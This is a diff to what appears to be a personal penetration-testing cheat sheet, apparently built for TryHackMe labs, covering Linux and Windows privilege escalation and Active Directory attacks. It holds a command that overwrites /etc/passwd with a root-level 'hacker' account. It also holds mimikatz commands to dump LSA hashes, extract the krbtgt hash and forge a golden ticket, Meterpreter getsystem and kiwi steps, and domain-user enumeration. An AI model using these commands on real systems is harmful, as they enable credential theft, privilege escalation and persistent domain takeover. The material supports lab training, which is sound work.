@@ -79,6 +79,11 @@ tree tmp
 echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
 ```
 
+fix PATH in old ubuntu
+```
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
 </details>
 
 ---
@@ -240,6 +245,8 @@ cat /etc/exports #file sharing
 nmap --script=vuln <ip>
 cat /proc/1/cgroup #if u in docker
 ```
+
+
 #### links
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [linEnum](https://github.com/rebootuser/LinEnum)
@@ -424,12 +431,21 @@ runas.exe (to inject the credentials into memory)
 runas.exe /netonly /user:<domain>\<username> cmd.exe
 ```
 
+mimikatz
+```
+privilege::debug #ensure that the output is "Privilege '20' ok"
+lsadump::lsa /patch #dump hashes
+lsadump::lsa /inject /name:krbtgt # dumps hash and security id of kerb ticket
+kerberos::golden /user: /domain: /sid: /krbtgt: /id: #create a golden ticket!
+misc::cmd #open cmd with elevated priveleges to all machines
+```
+
 links
 * [WADComs (AD)](https://wadcoms.github.io/)
 
 </details>
 
-<details><summary>Priv esc/enum</summary>
+<details><summary>enumeration</summary>
 
 run powershell with bypass execution policy
 ```
@@ -442,7 +458,14 @@ net user
 net users
 net localgroups
 net user <user>
-net group /<domain>
+net group /domain
+net user /domain
+net user <user> /domain
+Get-ADUser(Get-ADGroup) -Identity <user(group)> -Server <domain> -Properties *
+Get-ADUser -Filter 'Name -like "*<user>"' -Server <domain> | Format-Table Name,SamAccountName -A
+Get-ADUser -Filter 'Name -like "*stevens"' -Server <domain> | Format-Table Name,SamAccountName -A
+Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
+Get-ADDomain
 netsh firewall show state
 netsh firewall show config
 netstat -ano
@@ -459,14 +482,14 @@ get-netuser | select cn #enum domain users
 Get-NetGroup -GroupName *admin* #enum domain groups
 ```
 
-mimikatz
+meterpreter
 ```
-privilege::debug #ensure that the output is "Privilege '20' ok"
-lsadump::lsa /patch #dump hashes
-lsadump::lsa /inject /name:krbtgt # dumps hash and security id of kerb ticket
-kerberos::golden /user: /domain: /sid: /krbtgt: /id: #create a golden ticket!
-misc::cmd #open cmd with elevated priveleges to all machines
+run post/multi/recon/local_exploit_suggester #in session
+getsystem
+getprivs
+load kiwi #download mimikatz
 ```
+
 
 - [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 - [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
